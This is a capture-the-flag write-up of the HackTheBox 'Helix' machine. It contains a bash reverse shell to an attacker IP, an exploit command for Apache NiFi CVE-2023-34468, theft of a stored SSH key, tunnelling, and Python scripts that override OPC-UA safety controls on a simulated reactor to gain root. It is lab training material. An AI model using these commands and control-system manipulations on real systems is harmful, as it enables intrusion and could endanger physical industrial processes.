🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Helix: HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9ef7dfc0282a2ed0dfd37bc16fd15bb5.png" width="120"/>
<div>

**Difficulty**: Medium
**OS**: Linux
**Type**: ICS / Middleware / OPC-UA

</div>
</div>

---

## Attack Chain Summary

```
RCE via CVE-2023-34468 (Apache NiFi 1.21.0, ExecuteSQL + H2 JDBC)
-> nifi shell
-> operator SSH key in NiFi support-bundles
-> User flag
-> OPC-UA manipulation (MAINTENANCE mode + TestOverride + CalibrationOffset ramp)
-> Maintenance window opens -> sudo helix-maint-console
-> ROOT
```

---

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC helix.htb -oN scan.txt
```

Open ports:
- **80**: nginx (reverse proxy to NiFi)

### Service Discovery

The vhost `flow.helix.htb` exposes an **Apache NiFi 1.21.0** instance accessible without authentication.
The version is visible through the *About Apache NiFi* menu in the interface.

---

## Foothold: RCE via CVE-2023-34468

### Vulnerability

Apache NiFi <= 1.22.0 is vulnerable to **unauthenticated remote code execution** via the `ExecuteSQL` processor. By configuring a malicious H2 JDBC URL with `INIT=RUNSCRIPT`, it is possible to make the server execute arbitrary SQL, including system calls through `EXEC`.

### Exploitation with koi

A listener is started with koi first, then the public PoC [Al3xx-sec/CVE-2023-34468-POC](https://github.com/Al3xx-sec/CVE-2023-34468-POC) is used:

```bash
# koi automatically generates payloads for the tun0 interface
b3rt1ng@koi❯ payload tun0
# -> bash: bash -c "bash -i >& /dev/tcp/10.10.16.6/4010 0>&1"

# Exploitation
python3 exploit.py -u http://flow.helix.htb/nifi -l 10.10.16.6 -p 4010
```

koi receives the shell and offers the automatic upgrade:

```
▶  New session #1  10.129.223.240:54146 [ linux ]
b3rt1ng@koi(1 session) ❯ upgrade 1
  ✔  Shell #1 upgraded successfully.
b3rt1ng@koi(1 session) ❯ go 1
nifi@helix:/opt/nifi-1.21.0$
```

---

## Post-Exploitation Enumeration (nifi)

### System Information via koi

```
b3rt1ng@koi(1 session) ❯ run sysinfo 1
╭──────────────────────── System Info : #1 ────────────────────────╮
│  hostname  : helix                                               │
│  OS        : Ubuntu 22.04.5 LTS                                  │
│  arch      : x86_64                                               │
│  user      : uid=998(nifi) gid=998(nifi)                         │
│  IP        : 10.129.223.240                                      │
╰──────────────────────────────────────────────────────────────────╯

b3rt1ng@koi(1 session) ❯ run env_dump 1
# Nothing sensitive in the environment variables.

b3rt1ng@koi(1 session) ❯ run memorybleed 1
# No credentials in memory.
```

### Internal Ports

```bash
# In the nifi shell
ss -tlnp
```

Internal ports discovered:
- **4840**: OPC-UA (`opc.tcp://127.0.0.1:4840/helix/`)
- **8081**: Helix HMI (Werkzeug/Python)

The HMI on port 8081 reveals an industrial reactor control panel:

```bash
curl -s http://127.0.0.1:8081/
# -> Helix Industries: Reactor HMI
# -> Temperature: 284.0°C | Pressure: 69.00 bar
# -> Maintenance Window: CLOSED
# -> OPC UA (internal): opc.tcp://127.0.0.1:4840/helix/
```

### Operator SSH Key

```bash
find /opt/nifi-1.21.0 -name "*.bak" 2>/dev/null
# -> /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak

cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
# -> -----BEGIN OPENSSH PRIVATE KEY-----
```

A private ed25519 SSH key is stored in plaintext inside the NiFi support-bundles.

---

## User Flag

```bash
chmod 600 operator_id_ed25519
ssh -i operator_id_ed25519 operator@helix.htb
cat ~/user.txt
```

## Privilege Escalation

### Enumeration

```bash
sudo -l
```

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

`helix-maint-console` requires the **Maintenance Window** to be open. It is controlled by the PLC through OPC-UA.

### Retrieving Operator Documents

koi's `download` module is used to retrieve files from the operator home directory. Spaces in filenames require renaming beforehand on the target:

```bash
# On the target
cp ~/control\ systems\ diagram.png /tmp/diagram.png
cp ~/Operator\ Control\ \&\ Safety\ Guide.pdf /tmp/guide.pdf
```

```
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/diagram.png
b3rt1ng@koi(1 session) ❯ run download 1 /tmp/guide.pdf
```

The PDF is protected with the password `operator 1` (cracked with john + rockyou). It is decrypted:

```bash
python3 -c "
import pikepdf
pdf = pikepdf.open('guide.pdf', password='operator 1')
pdf.save('guide_unlocked.pdf')
"
```

The diagram and the PDF document the system logic:

> The Maintenance Window opens when **Temp >= 295°C OR Pressure >= 73 bar**, without triggering a safety trip (305°C / 75 bar), and only in **MAINTENANCE mode** with **TestOverride enabled**.

### Tunneling to OPC-UA with koi + ligolo

Port 4840 is only reachable on loopback on the target. koi's ligolo module is used to upload the agent automatically:

```
b3rt1ng@koi(1 session) ❯ run ligolo 1
  ✔  Agent uploaded to /tmp/agent
```

```bash
# On Kali, start the ligolo proxy
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# On the target
/tmp/agent -connect 10.10.16.6:11601 -ignore-cert
```

```
# In the ligolo console
ligolo-ng » session
[Agent : nifi@helix] » start

# 240.0.0.1 is the ligolo alias for the remote agent's 127.0.0.1
sudo ip route add 240.0.0.1/32 dev ligolo
```

### Discovering OPC-UA Nodes

```bash
pip3 install asyncua --break-system-packages

python3 << 'EOF'
from asyncua.sync import Client
from asyncua import ua

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

for i in range(1, 100):
    try:
        node = c.get_node(ua.NodeId(i, 2))
        name = node.read_browse_name()
        val  = node.read_value()
        print(f"ns=2;i={i} | {name.Name} = {val}")
    except:
        pass

c.disconnect()
EOF
```

```
ns=2;i=3  | TemperatureRaw     = 283.97
ns=2;i=4  | Temperature        = 283.97
ns=2;i=5  | Pressure           = 68.99
ns=2;i=6  | CalibrationOffset  = 0.0
ns=2;i=8  | RodsInserted       = False
ns=2;i=9  | EmergencyCooling   = False
ns=2;i=10 | TripActive         = False
ns=2;i=12 | Mode               = NORMAL
ns=2;i=13 | TestOverride       = False
ns=2;i=14 | ResetTrip          = False
```

Writable nodes identified:

| NodeId    | Name              | Access    |
|-----------|-------------------|-----------|
| ns=2;i=6  | CalibrationOffset | Writable  |
| ns=2;i=12 | Mode              | Writable  |
| ns=2;i=13 | TestOverride      | Writable  |
| ns=2;i=14 | ResetTrip         | Writable  |

### OPC-UA Manipulation: Opening the Maintenance Window

According to the PDF, the order of operations is critical:
1. Switch to `MAINTENANCE` mode
2. Enable `TestOverride`
3. Raise `CalibrationOffset` progressively, since too aggressive a ramp triggers a safety trip (>= 305°C)

```python
from asyncua.sync import Client
from asyncua import ua
import time

c = Client("opc.tcp://240.0.0.1:4840/helix/", timeout=30)
c.connect()

# Step 1: MAINTENANCE mode
mode = c.get_node(ua.NodeId(12, 2))
mode.write_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
print(f"[+] Mode: {mode.read_value()}")

# Step 2: TestOverride = True
override = c.get_node(ua.NodeId(13, 2))
override.write_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
print(f"[+] TestOverride: {override.read_value()}")

# Step 3: Ramp CalibrationOffset up to 12.0 (Temp ~ 296°C)
offset = c.get_node(ua.NodeId(6, 2))
for val in [3.0, 6.0, 9.0, 12.0]:
    offset.write_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
    temp = c.get_node(ua.NodeId(4, 2)).read_value()
    print(f"[+] Offset={val} -> Temp={temp:.2f}°C")
    time.sleep(1)

c.disconnect()
```

```
[+] Mode: MAINTENANCE
[+] TestOverride: True
[+] Offset=3.0  -> Temp=287.06°C
[+] Offset=6.0  -> Temp=290.13°C
[+] Offset=9.0  -> Temp=293.18°C
[+] Offset=12.0 -> Temp=296.22°C
```

### Root Shell

Once the Maintenance Window is open, `helix-maint-console` is launched immediately (it is a time-limited window):

```bash
sudo /usr/local/sbin/helix-maint-console
```

```
[+] Privileged maintenance access granted
[!] Window expires in 113 seconds
root@helix:~#
```

---

## Root Flag

```bash
cat /root/root.txt
```
